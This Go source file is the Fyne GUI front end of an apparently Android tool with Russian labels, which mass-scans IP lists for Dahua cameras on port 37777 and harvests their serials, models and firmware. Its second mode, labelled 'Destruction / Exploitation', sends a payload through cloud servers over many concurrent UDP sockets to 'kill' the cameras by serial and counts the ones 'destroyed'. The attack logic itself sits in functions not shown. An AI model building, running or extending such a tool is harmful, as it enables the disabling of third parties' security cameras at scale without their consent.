package main

import (
	"context"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/storage"
	"fyne.io/fyne/v2/widget"
)

func main() {
	myApp := app.New()
	myWindow := myApp.NewWindow("Android IronScan GUI")

	var showMenu func()

	titleLabel := widget.NewLabelWithStyle("Железный Сканер Dahua", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	statusLabel := widget.NewLabel("Настройки сканера")

	threadsEntry := widget.NewEntry()
	threadsEntry.SetText("50")
	threadsEntry.SetPlaceHolder("Максимум 1000")

	portEntry := widget.NewEntry()
	portEntry.SetText("37777")
	portEntry.SetPlaceHolder("Один порт (например: 37777, 8000)")

	outputEntry := widget.NewEntry()
	outputEntry.SetText("serials")
	outputEntry.SetPlaceHolder("Имя любого файла")

	logContent := widget.NewMultiLineEntry()
	logContent.SetPlaceHolder("Здесь будут отображаться шаги работы...")
	logContent.Disable()

	backToMenuBtn1 := widget.NewButton("Назад в меню", func() {
		showMenu()
	})

	filePickerButton := widget.NewButton("Запуск", func() {
		fileDialog := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				statusLabel.SetText("Ошибка: " + err.Error())
				return
			}
			if reader == nil {
				statusLabel.SetText("Выбор файла отменен")
				return
			}
			statusLabel.SetText("Обработка файла...")
			logContent.SetText("[SYSTEM] Файл успешно выбран. Инициализация...\n")

			go func(r fyne.URIReadCloser) {
				defer r.Close()
				appendLog(logContent, "[SYSTEM] Чтение сырых данных из файла...")
				data, err := io.ReadAll(r)
				if err != nil {
					statusLabel.SetText("Не удалось прочитать файл")
					appendLog(logContent, "[ERROR] Ошибка io.ReadAll: " + err.Error())
					return
				}
				appendLog(logContent, fmt.Sprintf("[SYSTEM] Прочитано %d байт. Очистка строк от символов \\r...", len(data)))

				concurrency, err := strconv.Atoi(strings.TrimSpace(threadsEntry.Text))
				if err != nil || concurrency < 1 {
					concurrency = 50
					threadsEntry.SetText("50")
				} else if concurrency > 1000 {
					concurrency = 1000
					threadsEntry.SetText("1000")
				}

				basePort, err := strconv.Atoi(strings.TrimSpace(portEntry.Text))
				if err != nil || basePort <= 0 || basePort > 65535 {
					basePort = 37777
					portEntry.SetText("37777")
				}

				outNameBase := strings.TrimSpace(outputEntry.Text)
				if outNameBase == "" {
					outNameBase = "serials"
				}

				cleanText := strings.ReplaceAll(string(data), "\r", "")
				lines := strings.Split(cleanText, "\n")
				var finalTargets []string

				appendLog(logContent, "[SYSTEM] Запуск парсинга целей...")
				for i, line := range lines {
					line = strings.TrimSpace(line)
					if line == "" || strings.HasPrefix(line, "#") {
						continue
					}

					parsedLines := ParseTarget(line)
					if len(parsedLines) == 0 {
						appendLog(logContent, fmt.Sprintf("[WARN] Строка %d пропущена парсером: %s", i+1, line))
						continue
					}

					for _, parsed := range parsedLines {
						parsed = strings.TrimSpace(parsed)
						if parsed == "" {
							continue
						}
						if _, _, err := net.SplitHostPort(parsed); err == nil {
							finalTargets = append(finalTargets, parsed)
						} else {
							finalTargets = append(finalTargets, net.JoinHostPort(parsed, strconv.Itoa(basePort)))
						}
					}
				}

				appendLog(logContent, fmt.Sprintf("[SYSTEM] Анализировано целей: %d", len(finalTargets)))
				if len(finalTargets) == 0 {
					statusLabel.SetText("Валидные IP не найдены")
					appendLog(logContent, "[ERROR] Сканирование невозможно: список целей пуст.")
					return
				}

				timestamp := time.Now().Format("20060102_150405")
				defaultFileName := fmt.Sprintf("%s_%s.txt", outNameBase, timestamp)

				saveDialog := dialog.NewFileSave(func(outFile fyne.URIWriteCloser, err error) {
					if err != nil {
						statusLabel.SetText("Ошибка создания файла: " + err.Error())
						return
					}
					if outFile == nil {
						statusLabel.SetText("Сохранение результатов отменено")
						return
					}

					appendLog(logContent, "[SYSTEM] Выходной файл подтвержден. Запуск сетевых воркеров...")
					statusLabel.SetText(fmt.Sprintf("Сканирование %d целей...", len(finalTargets)))

					go func(out fyne.URIWriteCloser) {
						defer out.Close()

						opts := Options{
							Targets:     finalTargets,
							Port:        basePort,
							Timeout:     2 * time.Second,
							Concurrency: concurrency,
							Retries:     1,
						}

						LogHook = func(format string, args ...any) {
							msg := fmt.Sprintf(format, args...)
							appendLog(logContent, "[CORE] " + msg)
						}

						ctx := context.Background()
						successCount := 0

						scanErr := Run(ctx, opts, func(res Result) {
							if res.Ok() {
								successCount++
								lineData := fmt.Sprintf("%s;%s;%s;%s\n", res.Target, res.Serial, res.Model, res.Firmware)
								if _, writeErr := out.Write([]byte(lineData)); writeErr != nil {
									appendLog(logContent, "[ERROR] Ошибка записи на диск: " + writeErr.Error())
								}
								foundMsg := fmt.Sprintf("[FOUND] %s -> %s (%s)", res.Target, res.Serial, res.Model)
								appendLog(logContent, foundMsg)
							}
						})

						if scanErr != nil {
							statusLabel.SetText("Ошибка работы: " + scanErr.Error())
							appendLog(logContent, "[ERROR] Сканер аварийно завершился: " + scanErr.Error())
						} else {
							statusLabel.SetText(fmt.Sprintf("Успешно! Найдено устройств: %d", successCount))
							appendLog(logContent, fmt.Sprintf("[SYSTEM] Сканирование полностью завершено. Успешных находок: %d", successCount))
						}
					}(outFile)
				}, myWindow)

				saveDialog.SetFileName(defaultFileName)
				saveDialog.Show()
			}(reader)
		}, myWindow)

		fileDialog.SetFilter(storage.NewExtensionFileFilter([]string{".txt"}))
		fileDialog.Show()
	})

	settingsForm := widget.NewForm(
		widget.NewFormItem("Потоки (Threads):", threadsEntry),
		widget.NewFormItem("Порт по умолчанию:", portEntry),
		widget.NewFormItem("Имя файла результатов:", outputEntry),
	)

	scanContent := container.NewVBox(
		titleLabel,
		settingsForm,
		filePickerButton,
		statusLabel,
		logContent,
		backToMenuBtn1,
	)

	crashTitle := widget.NewLabelWithStyle("Режим: Деструкция / Эксплуатация", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
	crashStatus := widget.NewLabel("Ожидание выбора целей...")
	crashLog := widget.NewMultiLineEntry()
	crashLog.SetPlaceHolder("Логи деструктивных действий будут здесь...")
	crashLog.Disable()

	backToMenuBtn2 := widget.NewButton("Назад в меню", func() {
		showMenu()
	})

	crashContent := container.NewVBox(
		crashTitle,
		widget.NewButton("Запустить Сплоит / Атаку", func() {
			fileDialog := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
				if err != nil {
					crashStatus.SetText("Ошибка: " + err.Error())
					return
				}
				if reader == nil {
					crashStatus.SetText("Выбор файла отменен")
					return
				}
				crashStatus.SetText("Атака запущена...")
				crashLog.SetText("[CRITICAL] Посылаем payload...\n")

				go func(r fyne.URIReadCloser) {
					defer r.Close()
					data, err := io.ReadAll(r)
					if err != nil {
						crashStatus.SetText("Не удалось прочитать файл")
						appendLog(crashLog, "[ERROR] Ошибка io.ReadAll: " + err.Error())
						return
					}

					cleanText := strings.ReplaceAll(string(data), "\r", "")
					lines := strings.Split(cleanText, "\n")
					var serials []string
					for _, line := range lines {
						line = strings.TrimSpace(line)
						if line != "" && !strings.HasPrefix(line, "#") {
							serials = append(serials, line)
						}
					}

					if len(serials) == 0 {
						crashStatus.SetText("Серийники не найдены")
						return
					}

					stats := &ScanStats{Total: int64(len(serials))}
					cloudIPs := lookupCloudIPs()
					if len(cloudIPs) == 0 {
						crashStatus.SetText("Ошибка резолва сервера")
						return
					}

					concurrency, _ := strconv.Atoi(threadsEntry.Text)
					if concurrency <= 0 {
						concurrency = 50
					}

					conns := make([]*net.UDPConn, 0, concurrency)
					for i := 0; i < concurrency; i++ {
						conn, err := newEgress(cloudIPs[i%len(cloudIPs)])
						if err != nil {
							break
						}
						conns = append(conns, conn)
					}

					if len(conns) == 0 {
						crashStatus.SetText("Не удалось создать сокеты")
						return
					}
					defer func() {
						for _, c := range conns {
							c.Close()
						}
					}()

					limiter := newRateLimiter(MAX_RPS, BURST_LIMIT)
					jobs := make(chan string, len(conns)*10)
					aliveCh := make(chan string, len(conns)*10)
					ctx, cancel := context.WithCancel(context.Background())
					defer cancel()

					for _, conn := range conns {
						go func(c *net.UDPConn) {
							defer func() { _ = recover() }()
							scanWorker(ctx, c, jobs, aliveCh, stats, ACK_TIMEOUT, limiter, nil)
						}(conn)
					}

					go func() {
						for s := range aliveCh {
							appendLog(crashLog, "[KILLED] " + s)
						}
					}()

					go func() {
						ticker := time.NewTicker(500 * time.Millisecond)
						defer ticker.Stop()
						for {
							select {
							case <-ctx.Done():
								return
							case <-ticker.C:
								ch := atomic.LoadInt64(&stats.Checked)
								al := atomic.LoadInt64(&stats.Alive)
								dd := atomic.LoadInt64(&stats.Dead)
								crashStatus.SetText(fmt.Sprintf("Проверено: %d | Убито: %d | Мёртво: %d / %d", ch, al, dd, stats.Total))
							}
						}
					}()

					for _, s := range serials {
						jobs <- s
					}
					close(jobs)

					for {
						ch := atomic.LoadInt64(&stats.Checked)
						if ch >= stats.Total {
							break
						}
						time.Sleep(100 * time.Millisecond)
					}
					cancel()
					close(aliveCh)
					crashStatus.SetText(fmt.Sprintf("Завершено! Всего уничтожено: %d", atomic.LoadInt64(&stats.Alive)))
				}(reader)
			}, myWindow)
fileDialog.SetFilter(storage.NewExtensionFileFilter([]string{".txt"}))
fileDialog.Show()
}),
crashStatus,
crashLog,
backToMenuBtn2,
)
showMenu = func() {
menuTitle := widget.NewLabelWithStyle("Выберите режим работы", fyne.TextAlignCenter, fyne.TextStyle{Bold: true})
btnCrash := widget.NewButton("1. Крушим камери", func() {
myWindow.SetContent(crashContent)
})
btnScan := widget.NewButton("2. Скан префиксов из айпи", func() {
myWindow.SetContent(scanContent)
})
menuLayout := container.NewVBox(
menuTitle,
layout.NewSpacer(),
btnCrash,
btnScan,
layout.NewSpacer(),
)
myWindow.SetContent(menuLayout)
}
showMenu()
myWindow.Resize(fyne.NewSize(450, 550))
myWindow.ShowAndRun()
}
func appendLog(entry *widget.Entry, text string) {
current := entry.Text
if current == "" {
entry.SetText(text)
} else {
entry.SetText(current + "\n" + text)
}
}
